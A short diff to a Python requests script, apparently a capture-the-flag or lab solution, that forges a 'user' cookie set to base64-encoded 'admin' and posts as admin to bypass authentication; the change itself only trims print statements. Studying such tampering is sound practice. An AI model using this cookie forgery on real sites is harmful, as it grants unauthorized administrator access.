@@ -10,11 +10,8 @@ s = requests.Session()
 
 # Get page -> receives cookie
 r = s.get(url)
-print("GET Response:", r.text)
 
 # Set admin cookie
 s.cookies.set("user", base64.b64encode(b'admin').decode())
 r = s.post(url, data={'username': 'admin'})
-
-print("\nPOST Status:", r.status_code)
-print("POST Response:", r.text)
+print( r.text)
